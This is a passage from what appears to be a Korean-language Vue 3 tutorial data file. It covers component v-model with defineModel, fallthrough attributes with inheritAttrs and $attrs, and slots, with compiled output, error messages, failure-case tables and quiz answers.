        body: "Node의 compileScript로 const model = defineModel<string>({ required: true })와 defineEmits<{ change: [id: number] }>()를 가진 SFC를 컴파일하니 출력은 props: _mergeModels({ msg…, count… }, { \"modelValue\": { type: String, ...{ required: true } }, \"modelModifiers\": {} }), emits: _mergeModels([\"change\"], [\"update:modelValue\"]), setup 안 const model = _useModel<string>(__props, \"modelValue\")였습니다. 템플릿 컴파일에서 <Comp v-model:title=\"t\" @update:title.once=\"f\">는 _createVNode(_component_Comp, { title: _ctx.t, \"onUpdate:title\": _cache[1] || (_cache[1] = $event => ((_ctx.t) = $event)), \"onUpdate:titleOnce\": _ctx.f }, null, 8 /* PROPS */, [\"title\", \"onUpdate:titleOnce\"]). v-model이 prop + onUpdate 핸들러로 풀리고 핸들러는 캐시됩니다. bindingMetadata로 p가 prop임을 알리고 <input v-model=\"p\">를 컴파일하니 에러 'v-model cannot be used on a prop, because local prop bindings are not writable. Use a v-bind binding combined with a v-on listener that emits update:x event instead.'(에러 참고서 컴파일러 코드 44). 네이티브 v-model은 withDirectives(…, [[vModelText, v, undefined, { trim, number }]])로 수식어가 디렉티브 인자에 들어갔습니다(폼 노드). 부모 측 수식어 .capitalize는 자식에 modelModifiers prop으로 전달됩니다.",
        code: "// compileScript (vue 3.5.45)\nconst model = defineModel<string>({ required: true })\n→ props: /*@__PURE__*/_mergeModels({ … }, { \"modelValue\": { type: String, ...{ required: true } }, \"modelModifiers\": {} })\n→ emits: /*@__PURE__*/_mergeModels([\"change\"], [\"update:modelValue\"])\n→ setup(__props, { expose: __expose, emit: __emit }) { const model = _useModel<string>(__props, \"modelValue\") … }\n\n// 템플릿 컴파일 — 부모 쪽\n<Comp v-model:title=\"t\" @update:title.once=\"f\" />\n→ _createVNode(_component_Comp, { title: _ctx.t, \"onUpdate:title\": _cache[1] || (_cache[1] = $event => ((_ctx.t) = $event)), \"onUpdate:titleOnce\": _ctx.f }, null, 8 /* PROPS */, [\"title\", \"onUpdate:titleOnce\"])\n\n// prop 에 v-model\n<input v-model=\"p\">  (p 가 prop)  → error: v-model cannot be used on a prop, because local prop bindings are not writable. Use a v-bind binding combined with a v-on listener that emits update:x event instead.",
      },
      {
        label: "문제: 자식의 defineModel 에 default 를 줬는데 부모 값과 다르다",
        body: "<Counter v-model=\"count\" />에서 부모의 count가 ref()(undefined)이고 자식이 defineModel({ default: 1 })입니다. 자식 화면은 1인데 부모 count는 undefined입니다. 문서의 경고가 이 자리입니다. default는 prop이 없을 때 자식 쪽에서만 적용되고 부모에게 update 이벤트를 내지 않으므로 둘이 어긋납니다. 처방은 부모가 초깃값을 정하는 것입니다(ref(1)). 자식이 기본값을 정해야 하는 설계면 defineModel({ required: true })로 부모가 반드시 주게 하거나, 마운트 때 model.value가 undefined면 model.value = 1로 써서 update를 올려 부모를 맞춥니다. v-model의 진실은 부모 쪽입니다.",
      },
      {
        label: "문제가 나는 경우: 짝과 방향을 모를 때",
        body: "경우 ㄱ, default 어긋남입니다. 위의 사고입니다. 경우 ㄴ, prop에 v-model. 컴파일 에러(실제로). defineModel 또는 :value + @update. 경우 ㄷ, 3.4 전에 defineModel. 없음. props/emits 수동. 경우 ㄹ, 자식이 props.modelValue를 직접 바꿈. readonly 경고. emit('update:modelValue'). 경우 ㅁ, 인자 이름 불일치. v-model:title에 defineModel('Title'). 매칭 안 됨. 같은 이름(camel). 경우 ㅂ, 수식어를 prop 이름으로 못 찾음. 인자 있으면 titleModifiers. 경우 ㅅ, 객체를 v-model로 넘기고 안을 바꿈. update 이벤트 없이 공유 변경. 새 객체로 set. 경우 ㅇ, <component :is=\"'input'\"> 네이티브에 v-model. modelValue로 확장되어 안 됨. :value + @input. 경우 ㅈ, 여러 v-model 중 하나만 update. 각각 짝. 경우 ㅊ, 수식어 변환을 get에 넣어 표시만 바꾸려는데 부모 값이 바뀜. get은 읽기, set은 쓰기 변환. 경우 ㅋ, modelValue를 emit 없이 로컬 ref에 복사해 쓰고 끝. 부모가 모름. useModel/emit. 경우 ㅌ, 부모가 v-model 없이 쓰는데 자식 model.value 쓰기를 기대. 로컬처럼 동작(됨).",
        code: "경우               언제 생기나                        겉모습                                              처방\nㄱ default 어긋남     defineModel({ default }) + 부모 undefined   자식 1 · 부모 undefined                       부모 초깃값 · required\nㄴ prop 에 v-model    <input v-model=\"propX\">              v-model cannot be used on a prop…                   defineModel\nㄷ 3.4 전           defineModel 없음                      에러                                              수동 짝\nㄹ prop 직접 변경     props.modelValue = x                  readonly 경고                                      emit('update:modelValue')\nㅁ 인자 불일치       v-model:title ↔ defineModel('Title')   안 맞음                                            같은 이름\nㅂ 수식어 이름       인자 있는 수식어                        titleModifiers 에 있음                               arg + 'Modifiers'\nㅅ 객체 안 변경      model.value.a = 1                    update 없음 · 공유 변경                              model.value = { …, a: 1 }\nㅇ 네이티브 :is      <component :is=\"'input'\" v-model>      modelValue 로 확장 → 안 됨                           :value + @input\nㅈ 여러 모델 혼동     v-model:a v-model:b                  각각 update:a · update:b                            -\nㅊ get/set 혼동      get 에 변환                           읽기만 바뀜                                        set\nㅋ 로컬 복사만       ref(props.modelValue)                부모 모름                                           useModel · emit\nㅌ 부모 v-model 없음  model.value = x                      로컬처럼 동작 (됨)                                   -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: v-model 은 '진실은 부모, 자식은 읽고 요청한다' 를 prop + 이벤트로 적은 계약이다",
        body: "컴포넌트 v-model은 새 메커니즘이 아니라 props(아래로, 읽기 전용)와 emit(위로, 요청)의 짝에 이름 규칙(modelValue / update:modelValue)을 붙인 것입니다. 진실은 부모 쪽이라 default는 자식만 바꿔 어긋나고(ㄱ), 자식이 prop을 직접 쓰면 막히고(ㄴ, ㄹ), 객체 안을 바꾸면 요청 없이 공유가 바뀝니다(ㅅ). defineModel은 그 짝을 선언하고 useModel로 '읽으면 prop, 쓰면 emit'인 ref를 만들어 자식 코드가 로컬 ref처럼 보이게 합니다(ㅋ, ㅌ). 인자와 수식어는 이름 규칙의 변형입니다(ㅁ, ㅂ, ㅊ). 처방은 v-model을 쓸 때 '이 prop 이름과 이 이벤트 이름'으로 풀어 생각하고, 초깃값·기본값은 진실인 부모에서 정하는 것입니다.",
        code: "<Child v-model:x.mod=\"val\" />\n  ≡  <Child :x=\"val\" :xModifiers=\"{ mod: true }\" @update:x=\"v => val = v\" />\n자식:  const [x, mods] = defineModel('x')  →  읽기: props.x · 쓰기: emit('update:x', v)   (useModel)\n\n진실 = 부모 → default 는 어긋남 (ㄱ) · prop 쓰기 막힘 (ㄴ ㄹ) · 객체 안 변경은 요청 없음 (ㅅ)\n인자 · 수식어 = 이름 규칙 변형 (ㅁ ㅂ ㅊ)",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "선언하지 않은 속성과 리스너가 가는 길이 다음 페이지 '폴스루 속성'입니다. 실제로 돌려 보면 class는 루트에 병합됐고, 다중 루트에서는 경고와 함께 버려졌으며, inheritAttrs: false면 $attrs로 손으로 둘 수 있었습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <DateRange>가 시작·종료 날짜 둘을 양방향으로 묶어야 합니다. 어떻게? (2) <MoneyInput v-model.cents=\"price\">에서 사용자는 '12.34'를 치고 부모는 1234(정수 센트)를 받아야 합니다. 어떻게? (3) 부모가 v-model 없이 <Toggle />만 쓰는데 자식 안에서 model.value = !model.value가 동작할까요?",
        notes: [
          {
            title: "답",
            body: "(1) const start = defineModel<Date>('start'); const end = defineModel<Date>('end'). 부모는 <DateRange v-model:start=\"from\" v-model:end=\"to\" />. 각각 start/update:start, end/update:end 짝으로 풀립니다(실제로 v-model:title이 title + onUpdate:title로 컴파일). 둘의 관계(start ≤ end)를 자식이 보정하려면 set에서 다른 쪽을 함께 쓰되, 진실은 부모이니 보정도 emit으로 나가야 합니다. (2) const [price, modifiers] = defineModel<number>({ get: (cents) => (cents / 100).toFixed(2), set: (text) => modifiers.cents ? Math.round(parseFloat(text) * 100) : parseFloat(text) }). get은 부모 값(센트)을 입력창 표시로, set은 입력 문자열을 부모에 보낼 값으로 바꿉니다. 수식어는 modelModifiers prop으로 들어옵니다. 입력 중 소수점 처리를 섬세하게 하려면 v-model.lazy를 자식 input에. (3) 됩니다. 부모가 v-model(prop)을 안 줬으면 useModel이 자식 안의 로컬 상태로 동작해 읽기·쓰기가 로컬에서 끝납니다. 부모가 뒤에 v-model을 걸면 그때부터 부모가 진실입니다. 단 defineModel({ default })를 두면 부모가 undefined를 넘기는 경우 어긋날 수 있으니 주의합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Component v-model", href: `${DOCS}/guide/components/v-model` },
      { label: "defineModel()", href: `${DOCS}/api/sfc-script-setup#definemodel` },
      { label: "useModel()", href: `${DOCS}/api/composition-api-helpers#usemodel` },
    ],
  },

  {
    id: "vg-comp-attrs",
    name: "폴스루 속성",
    tagline: "선언하지 않은 속성과 리스너는 루트 요소로 흘러간다 — 루트가 하나일 때, 그리고 inheritAttrs 로 끌 수 있다",
    intro:
      "컴포넌트 심화 다섯째 페이지입니다. 부모가 컴포넌트에 넘겼지만 props·emits에 선언되지 않은 속성과 v-on 리스너를 '폴스루 속성'이라 하고, 자동으로 자식의 '단일 루트 요소'에 적용됩니다. class·style은 루트의 것과 병합, v-on 리스너는 추가(둘 다 울림). 루트가 또 다른 컴포넌트면 그쪽으로 다시 흘러갑니다. 끄려면 inheritAttrs: false(<script setup>은 3.3+ defineOptions({ inheritAttrs: false }))를 두고 $attrs(또는 useAttrs())로 원하는 요소에 v-bind=\"$attrs\". $attrs는 원래 케이스 그대로($attrs['foo-bar']), 리스너는 onClick, 그리고 '성능상 반응형이 아니라 watch로 볼 수 없다'. 루트가 여럿이면 자동 폴스루가 없고 $attrs를 명시적으로 바인딩하지 않으면 경고. 실제로 돌려 보면 class 'base extra' 병합, 미선언 @click이 루트의 네이티브 리스너로 울림, inheritAttrs: false에서 attrs가 안쪽 input에 적용, 다중 루트의 두 경고 문구('Extraneous non-props attributes (class)…', 'Extraneous non-emits event listeners (click)…')를 확인했습니다. 이 노드의 질문은 하나입니다. 선언 밖의 것은 어디로 가나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "<MyButton class=\"large\" />에서 MyButton이 class를 prop으로 선언하지 않았고 루트가 <button class=\"btn\">이면 결과는 <button class=\"btn large\">. class·style 병합. v-on: <MyButton @click=\"onClick\" />이면 루트 <button>의 네이티브 click에 onClick이 붙고, 루트 자체에 @click이 있으면 둘 다 울립니다. 중첩: 루트가 <BaseButton />이면 폴스루 속성은 BaseButton으로 다시 전달됩니다. 단, MyButton이 선언한 props·emits는 '소비'되어 아래로 안 갑니다. 끄기: export default { inheritAttrs: false } 또는 <script setup>에서 defineOptions({ inheritAttrs: false })(3.3+). 그러면 루트에 자동 적용되지 않고 $attrs로 손으로 둡니다. 전형: <div class=\"btn-wrapper\"><button class=\"btn\" v-bind=\"$attrs\">…</button></div>. $attrs: 선언 안 된 모든 것. 케이스 그대로(foo-bar는 $attrs['foo-bar']), @click은 $attrs.onClick. <script setup>에서 useAttrs(), setup(props, ctx)에서 ctx.attrs. '$attrs는 반응형이 아니다(성능). watch로 못 봄. 반응이 필요하면 prop으로, 또는 onUpdated에서'. 다중 루트: 자동 폴스루 없음. $attrs를 명시적으로 어느 요소에 바인딩하지 않으면 런타임 경고.",
        code: "<!-- MyButton.vue — 루트 <button class=\"btn\"> -->\n<MyButton class=\"large\" @click=\"onClick\" data-x=\"1\" />\n→ <button class=\"btn large\" data-x=\"1\">   + 네이티브 click 에 onClick (루트 @click 과 둘 다)\n\n<!-- 끄고 손으로 -->\n<script setup>\ndefineOptions({ inheritAttrs: false })     // 3.3+\nconst attrs = useAttrs()                    // 비반응형\n</script>\n<template>\n  <div class=\"btn-wrapper\">\n    <button class=\"btn\" v-bind=\"$attrs\">{{ label }}</button>   <!-- 여기로 -->\n  </div>\n</template>\n\n<!-- 다중 루트 — 자동 X · 명시 안 하면 경고 -->\n<header>…</header>\n<main v-bind=\"$attrs\">…</main>\n<footer>…</footer>\n\n// $attrs 모양\n$attrs['foo-bar']   // 케이스 그대로\n$attrs.onClick      // 리스너",
        terms: [
          {
            term: "폴스루 속성 (fallthrough attributes)",
            body: "컴포넌트에 넘겨졌지만 props나 emits로 선언되지 않은 속성과 리스너입니다. '컴포넌트가 모르는 것'이라 Vue는 그것을 컴포넌트의 루트 요소에 그대로 적용합니다. 래퍼 컴포넌트가 네이티브 요소처럼 동작하게 하는 장치입니다. class·style은 병합, 리스너는 추가, 나머지는 덮어씀. 루트가 하나여야 자리가 있고, inheritAttrs: false로 끄고 $attrs로 손으로 둘 수 있습니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 루트 <button class=\"base\">인 컴포넌트에 class=\"extra\"를 넘기니 className 'base extra'. emits 선언 없는 Raw에 @click을 걸고 루트 버튼을 클릭하니 네이티브 MouseEvent로 핸들러가 울렸습니다('Raw: click'). 루트 둘인 Multi에 class와 @click을 넘기니 경고 둘. '[Vue warn]: Extraneous non-props attributes (class) were passed to component but could not be automatically inherited because component renders fragment or text or teleport root nodes.'와 '[Vue warn]: Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes. If the listener is intended to be a component custom event listener only, declare it using the \"emits\" option.' Node의 SSR에서 inheritAttrs: false인 컴포넌트(루트 <div>, 안에 <input v-bind=\"attrs\">)에 class=\"x\" placeholder=\"p\"를 넘기니 <div><input class=\"x\" placeholder=\"p\"></div>로 안쪽 input에 갔습니다. emits: ['go']만 선언한 컴포넌트에 onGo와 onOther를 넘기니 attrs에는 class·data-x만 남고(onOther는 리스너라 별도 처리) props 선언된 것은 빠졌습니다. 다중 루트 SSR 출력은 <!--[--><p>a</p><p>b</p><!--]-->로 프래그먼트 표시가 남습니다.",
        code: "// Chrome 156\n<Btn class=\"extra\" /> (루트 class=\"base\")        → 'base extra'\n<Raw @click /> (emits 미선언 · 루트 <button>)      → 네이티브 click 폴스루 ('Raw: click')\n<Multi class=\"x\" @click /> (루트 둘)\n  → Extraneous non-props attributes (class) were passed to component but could not be automatically inherited because component renders fragment or text or teleport root nodes.\n  → Extraneous non-emits event listeners (click) were passed to component but could not be automatically inherited because component renders fragment or text root nodes. If the listener is intended to be a component custom event listener only, declare it using the \"emits\" option.\n\n// Node — SSR\ninheritAttrs: false + <input v-bind=\"attrs\"> · <X class=\"x\" placeholder=\"p\" />  → <div><input class=\"x\" placeholder=\"p\"></div>\n다중 루트 → <!--[--><p>a</p><p>b</p><!--]-->  (프래그먼트)",
      },
      {
        label: "문제: 입력 래퍼에 넘긴 placeholder 가 바깥 div 에 붙는다",
        body: "<FormInput placeholder=\"이메일\" class=\"mt-2\" />의 FormInput 템플릿이 <div class=\"field\"><label/><input/></div>입니다. placeholder와 class가 루트 <div>에 붙어 input에는 안 가고 여백은 div에 들어갑니다. 폴스루는 '루트 요소'에 가기 때문입니다. 처방은 inheritAttrs: false(<script setup>이면 defineOptions)로 자동 적용을 끄고 <input v-bind=\"$attrs\">로 안쪽에 둡니다. 실제로 돌려 보면 그렇게 하자 attrs가 안쪽 input에 갔습니다. class는 래퍼에 두고 나머지만 안으로 보내고 싶으면 const { class: cls, ...rest } = useAttrs()처럼 가르되 $attrs가 비반응형이라 갱신에 따라오지 않으니, 그런 경우는 class를 prop으로 선언해 받는 쪽이 안전합니다.",
      },
      {
        label: "문제가 나는 경우: 자리와 반응성을 모를 때",
        body: "경우 ㄱ, 래퍼의 루트에 붙음입니다. 위의 사고입니다. 경우 ㄴ, 다중 루트. 경고·버려짐(실제로). v-bind=\"$attrs\" 명시. 경우 ㄷ, $attrs를 watch. 비반응형이라 안 됨. prop 또는 onUpdated. 경우 ㄹ, $attrs 키를 camelCase로 찾음. 원래 케이스($attrs['foo-bar']). 경우 ㅁ, 선언한 prop이 $attrs에도 있을 거라 기대. 소비되어 없음. 경우 ㅂ, inheritAttrs: false를 <script setup>에 보통 export로. defineOptions(3.3+) 또는 별도 <script>. 경우 ㅅ, 중첩 래퍼에서 중간이 prop을 선언해 아래로 안 감. 소비됨. 명시 전달. 경우 ㅇ, 리스너가 네이티브로 가서 두 번 울림. emits 선언(이벤트 노드). 경우 ㅈ, style 폴스루가 루트 style을 덮을 거라 기대. 병합. 경우 ㅊ, Teleport가 루트인 컴포넌트에 폴스루. 자리 없음(경고 문구에 teleport 포함). 경우 ㅋ, 루트가 텍스트인 컴포넌트. 자리 없음. 경우 ㅌ, useAttrs()를 구조 분해해 보관. 갱신에 따라오지 않음. 매번 attrs.x로 읽기.",
        code: "경우               언제 생기나                       겉모습                                     처방\nㄱ 루트에 붙음       래퍼 <div><input/></div>            div 에 placeholder                          inheritAttrs:false + $attrs\nㄴ 다중 루트        루트 둘                            Extraneous … 경고 · 버려짐 (실제로)             v-bind=\"$attrs\" 명시\nㄷ $attrs watch     watch(() => attrs.x)               비반응 · 안 돎                              prop · onUpdated\nㄹ 케이스          $attrs.fooBar                      undefined                                  $attrs['foo-bar']\nㅁ 선언 prop 기대    $attrs.title (선언됨)               없음 (소비)                                 props\nㅂ setup 옵션       export default 혼용                 보통 <script> 필요                           defineOptions (3.3+)\nㅅ 중간 소비        중첩 래퍼가 prop 선언               아래로 안 감                                명시 전달\nㅇ 두 번 울림       미선언 click + emit                  네이티브 + emit                             emits 선언\nㅈ style 덮기 기대   style 폴스루                       병합                                       -\nㅊ Teleport 루트    루트가 <Teleport>                   자리 없음                                  내부 요소에 $attrs\nㅋ 텍스트 루트      루트가 텍스트                        자리 없음                                  요소로 감싸기\nㅌ attrs 구조 분해   const { x } = useAttrs()            갱신 안 따라옴                               attrs.x",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 폴스루는 '선언의 여집합' 이고, 갈 자리가 하나여야 자동이다",
        body: "컴포넌트가 받은 모든 속성·리스너 중 props·emits에 선언된 것은 소비되고(ㅁ, ㅅ), 나머지(여집합)가 폴스루입니다. 그 여집합은 '루트 요소'라는 한 자리로 가며(ㄱ), 자리가 없거나(다중 루트·텍스트·Teleport ㄴ, ㅊ, ㅋ) 끄면(inheritAttrs: false) $attrs로 손에 들어옵니다. $attrs는 매 렌더 새로 계산되는 스냅샷이라 반응형이 아니고 케이스도 원문입니다(ㄷ, ㄹ, ㅌ). 적용 규칙은 class·style 병합, 리스너 추가, 나머지 덮어씀(ㅈ). 처방은 '컴포넌트가 아는 것은 선언하고, 모르는 것은 어느 요소가 받을지 정하는' 것입니다. 네이티브처럼 보여야 하는 래퍼는 받을 요소에 v-bind=\"$attrs\"를 두고, 반응이 필요한 값은 prop으로 끌어올립니다.",
        code: "받은 전부 = 선언(props · emits → 소비 ㅁ ㅅ) ∪ 폴스루(여집합)\n폴스루 → 루트 요소 하나 (자동) · 병합(class·style ㅈ) · 추가(리스너) · 덮어씀\n  자리 없음 (다중 루트 ㄴ · 텍스트 ㅋ · Teleport ㅊ) 또는 inheritAttrs:false → $attrs (스냅샷 · 비반응 ㄷ ㅌ · 원문 케이스 ㄹ) → v-bind 로 손으로\n\n아는 것은 선언 · 모르는 것은 받을 요소를 정한다 · 반응 필요하면 prop",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "속성이 아니라 '내용'을 넘기는 길이 다음 페이지 '슬롯'입니다. 실제로 돌려 보면 내용을 안 넘기면 폴백이 렌더됐고, 기본 v-slot을 컴포넌트에 걸면서 이름 슬롯 template을 섞으면 컴파일 에러였습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <IconButton icon=\"save\" aria-label=\"저장\" @click=\"save\" />의 IconButton 루트는 <button>입니다. aria-label과 click은 어떻게 처리되나요? (2) 이 버튼을 <span class=\"tooltip\"><button/></span>으로 감쌌더니 aria-label이 span에 붙습니다. 어떻게? (3) 부모가 넘긴 data-track 속성 값이 바뀔 때 자식이 분석 이벤트를 다시 묶어야 합니다. $attrs를 watch하면 될까요?",
        notes: [
          {
            title: "답",
            body: "(1) icon은 prop으로 선언됐으니 소비되고, aria-label과 @click은 선언되지 않아 폴스루로 루트 <button>에 갑니다. aria-label은 속성으로, click은 네이티브 리스너로 붙어 save가 MouseEvent를 받습니다(실제로 미선언 click이 네이티브로 울림). emits에 click을 선언했다면 네이티브는 끊기니 안에서 $emit('click', $event)로 중계해야 합니다. (2) 폴스루는 루트(span)로 가므로 defineOptions({ inheritAttrs: false })로 끄고 <button v-bind=\"$attrs\">로 안쪽에 둡니다(실제로 attrs가 안쪽 input에 간 것 확인). tooltip용 class는 span에 남기고 싶으면 class를 prop으로 선언해 span에 바인딩하고 나머지만 $attrs로 넘깁니다. (3) 안 됩니다. $attrs는 반응형이 아니라 watch가 변화를 보지 못합니다. 문서의 처방은 둘입니다. data-track을 prop으로 선언해 watch하거나, onUpdated 훅에서 attrs.['data-track']을 읽어 전과 비교합니다. 반응이 필요한 값은 폴스루가 아니라 선언으로 끌어올리는 것이 맞습니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Fallthrough Attributes", href: `${DOCS}/guide/components/attrs` },
      { label: "inheritAttrs (Options: Misc)", href: `${DOCS}/api/options-misc#inheritattrs` },
      { label: "useAttrs()", href: `${DOCS}/api/composition-api-helpers#useattrs` },
    ],
  },

  {
    id: "vg-comp-slots",
    name: "슬롯",
    tagline: "부모가 자식 안에 내용을 넘기는 자리 — 내용은 부모 범위에서, 범위 슬롯은 자식 데이터를 부모에게",
    intro:
      "컴포넌트 심화 여섯째 페이지입니다. props가 값을 넘긴다면 슬롯은 템플릿 조각을 넘깁니다. 자식의 <slot />이 자리(outlet), 부모가 태그 사이에 쓴 것이 내용. 규칙: '슬롯 내용은 부모의 범위에서 평가된다'(자식의 데이터에 접근 불가, 자식의 <style scoped>도 적용 안 됨). <slot> 안의 내용은 폴백(안 넘기면 렌더). 이름 슬롯 <slot name=\"header\">와 부모의 <template #header>. 이름 없는 것은 default이고 template 밖의 최상위 노드는 암묵적 default. 조건부 슬롯은 $slots.header로 검사. 동적 이름 #[dynamicSlotName]. 범위 슬롯(scoped slots): 자식이 <slot :text=\"msg\" :count=\"1\" />로 데이터를 넘기고 부모가 v-slot=\"{ text, count }\"로 받습니다. 방향이 반대(자식 → 부모). '기본 범위 슬롯과 이름 슬롯을 섞을 때 v-slot을 컴포넌트에 직접 두면 컴파일 에러'. 렌더리스 컴포넌트는 로직만 하고 범위 슬롯으로 결과를 넘기는 패턴이되 컴포저블이 보통 더 낫습니다. 실제로 돌려 보면 내용을 넘기지 않은 slot은 폴백 '기본 슬롯 폴백'이 렌더됐고, 컴포넌트에 v-slot=\"x\"를 두고 안에 <template #a>를 섞으니 컴파일 에러 'Mixed v-slot usage on both the component and nested <template>. When there are multiple named slots, all slots should use <template> syntax…'였습니다. 이 노드의 질문은 하나입니다. 내용은 누구의 범위에서 평가되고, 데이터는 어느 방향으로 가나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "자식 FancyButton: <button class=\"fancy-btn\"><slot /></button>. 부모: <FancyButton>Click me!</FancyButton>. 내용에는 텍스트·요소·컴포넌트 전부 가능. 렌더 범위: '부모 템플릿의 식은 부모 범위만 접근'. {{ message }}는 부모의 message. 폴백: <slot>Submit</slot>은 내용이 없을 때 'Submit'. 이름 슬롯: <div class=\"container\"><header><slot name=\"header\" /></header><main><slot /></main><footer><slot name=\"footer\" /></footer></div>. 부모: <template #header>…</template>(v-slot:header의 축약). 이름 없는 최상위 노드는 암묵적 기본 슬롯. 조건부: <div v-if=\"$slots.header\" class=\"card-header\"><slot name=\"header\" /></div>. 동적 이름: <template #[dynamicSlotName]>. 범위 슬롯: 자식 <slot :text=\"greetingMessage\" :count=\"1\" />, 부모 <MyComponent v-slot=\"slotProps\">{{ slotProps.text }} {{ slotProps.count }}</MyComponent> 또는 구조 분해 v-slot=\"{ text, count }\". 이름 범위 슬롯: <template #header=\"headerProps\">. 'name은 예약이라 props로 안 넘어감'. 섞을 때: 기본 슬롯에 범위가 있고 이름 슬롯도 있으면 <template #default=\"props\">를 명시. v-slot을 컴포넌트에 직접 두면 컴파일 에러. 예: FancyList가 항목마다 <slot name=\"item\" v-bind=\"item\" />. 렌더리스: MouseTracker가 로직만 하고 <slot :x :y />. 컴포저블이 보통 대안.",
        code: "<!-- Child — 자리 · 폴백 · 이름 · 범위 -->\n<div class=\"card\">\n  <div v-if=\"$slots.header\" class=\"card-header\"><slot name=\"header\" /></div>   <!-- 조건부 -->\n  <slot>기본 내용 (폴백)</slot>\n  <ul><li v-for=\"item in items\" :key=\"item.id\"><slot name=\"item\" v-bind=\"item\" /></li></ul>   <!-- 범위 슬롯: 자식 → 부모 -->\n  <slot name=\"footer\" :count=\"items.length\" />\n</div>\n\n<!-- Parent — 내용은 부모 범위 -->\n<Card>\n  <template #header><h1>{{ parentTitle }}</h1></template>        <!-- parentTitle 은 부모 것 -->\n  <p>기본 슬롯 (암묵적)</p>\n  <template #item=\"{ body, username }\">{{ body }} by {{ username }}</template>   <!-- 자식 데이터 받기 -->\n  <template #footer=\"{ count }\">{{ count }} items</template>\n  <template #[dynamicName]>…</template>                             <!-- 동적 이름 -->\n</Card>\n\n<!-- ✗ 기본 범위 슬롯을 컴포넌트에 + 이름 슬롯 template → 컴파일 에러 -->\n<Card v-slot=\"x\"><template #header>…</template></Card>\n<!-- ✓ -->\n<Card><template #default=\"x\">…</template><template #header>…</template></Card>",
        terms: [
          {
            term: "범위 슬롯 (scoped slot)",
            body: "자식이 <slot :a=\"x\" :b=\"y\" />로 자기 데이터를 슬롯에 실어 보내고, 부모가 v-slot=\"{ a, b }\"로 받아 그 데이터로 내용을 그리는 슬롯입니다. 보통 데이터는 부모 → 자식(props)인데 범위 슬롯은 자식 → 부모입니다. 리스트 컴포넌트가 '항목 데이터는 내가 주고, 어떻게 그릴지는 네가 정하라'고 할 때 씁니다. 슬롯 props는 함수 인자처럼 전달되므로 구조 분해·기본값·이름 바꾸기가 됩니다. name은 예약어라 props로 넘어가지 않습니다.",
          },
          {
            term: "렌더 범위 (render scope)",
            body: "슬롯 내용 안의 식이 어느 컴포넌트의 변수를 보는가입니다. 부모 템플릿에 적힌 것이라 부모의 범위만 봅니다. 자식의 state·props는 보이지 않고(그래서 범위 슬롯이 필요), 자식의 <style scoped>도 적용되지 않습니다(슬롯 내용은 부모 소유. :slotted()로 자식이 스타일할 수 있음). 문서: 'Expressions in the parent template only have access to the parent scope.'",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Node의 renderToString에서 setup(props, { slots })가 slots.default?.() ?? '기본 슬롯 폴백'을 렌더하는 컴포넌트에 내용을 넘기지 않으니 '기본 슬롯 폴백'이 나왔습니다. 템플릿 컴파일에서 <Comp v-slot=\"x\"><template #a>y</template></Comp>는 에러 'Mixed v-slot usage on both the component and nested <template>. When there are multiple named slots, all slots should use <template> syntax to avoid scope ambiguity.'를 냈습니다(에러 참고서 컴파일러 코드). 디렉티브 없는 <template>은 네이티브 template 요소로 렌더됩니다. Teleport 안의 자식이 부모의 provide를 inject했듯(내장 컴포넌트 노드), 슬롯 내용도 논리적으로 부모 소유라 부모 범위입니다. 컴파일 출력에서 컴포넌트에 슬롯을 넘기면 { default: () => […], header: () => […] } 함수 객체가 자식 vnode의 children으로 들어가고(렌더 함수 노드), 자식은 slots.default()처럼 함수를 불러 vnode를 받습니다. 그래서 자식이 부르지 않으면 내용은 평가도 되지 않습니다(지연).",
        code: "// Node — 폴백\nsetup(props, { slots }) { return () => h('button', [slots.default?.() ?? '기본 슬롯 폴백']) }\n<Btn /> (내용 없음) → <button>기본 슬롯 폴백</button>\n\n// 컴파일 에러 — 혼합\n<Comp v-slot=\"x\"><template #a>y</template></Comp>\n→ error: Mixed v-slot usage on both the component and nested <template>. When there are multiple named slots, all slots should use <template> syntax to avoid scope ambiguity.\n\n// 슬롯은 함수다 (렌더 함수 모양)\nh(Card, null, { default: () => h('p', '기본'), header: () => h('h1', title), item: ({ body }) => h('li', body) })\n→ 자식이 slots.item(itemData) 를 부를 때 평가 (지연)",
      },
      {
        label: "문제: 리스트 컴포넌트가 항목 모양을 정해 버려서 재사용이 안 된다",
        body: "<UserList :users>가 항목을 <li>{{ user.name }}</li>로 고정했습니다. 다른 화면에서는 아바타와 배지가 필요합니다. props로 showAvatar, showBadge를 늘리면 끝이 없습니다. 처방은 범위 슬롯입니다. UserList는 '항목 데이터와 반복'만 맡고 <li v-for=\"user in users\" :key=\"user.id\"><slot name=\"item\" :user=\"user\" :index=\"i\">{{ user.name }}</slot></li>처럼 폴백만 두고, 쓰는 쪽이 <template #item=\"{ user }\"><Avatar :src=\"user.avatar\" /> {{ user.name }} <Badge v-if=\"user.admin\" /></template>로 모양을 정합니다. 데이터는 자식 → 부모로 흐르고 모양은 부모 범위에서 평가되므로 부모의 컴포넌트·상태를 그대로 씁니다. 로직(필터·정렬)만 재사용하고 DOM이 없다면 컴포저블(useUsers)이 더 가볍습니다.",
      },
      {
        label: "문제가 나는 경우: 범위와 방향을 모를 때",
